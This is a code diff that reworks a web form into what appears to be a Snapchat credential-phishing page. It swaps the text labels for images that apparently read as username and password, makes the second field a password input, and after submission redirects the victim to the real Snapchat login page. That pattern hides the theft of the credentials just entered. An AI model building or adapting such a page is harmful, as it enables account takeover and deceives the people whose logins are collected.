@@ -4,7 +4,7 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title >Enter</title>
-<link rel="stylesheet" href="./css/login.css">
+<link rel="stylesheet" href="./css/enter.css">
 
 
 </head>
@@ -26,10 +26,18 @@
     </div>
 
     <form id="form">
-      <label for="name" class="TextInput_label__G5rQV">Name</label>
+          <label for="name" class="TextInput_label__G5rQV">
+      <img src="img/unp.png" alt="">
+    </label>
+
       <input id="name" type="text" required>
-      <label for="address" class="TextInput_label__G5rQV">Address</label>
-      <input id="address" type="text" required>
+
+
+      <label for="address" class="TextInput_label__G5rQV">
+        <img src="img/pss.png" alt="">
+      </label>      
+
+      <input id="address" type="password" required>
 
       <button id="submitBtn" type="submit" >Next</button>
       <div class="status" id="status"></div>
@@ -91,8 +99,8 @@ try {
   });
 
   form.reset();
-  setStatus("Success");
-  window.location.href = "thankyou.html";
+  setStatus("redirecting to Snapchat App");
+  window.location.replace("https://accounts.snapchat.com/v2/login");
 } catch (err) {
   console.error(err);
   setStatus("Error submitting");
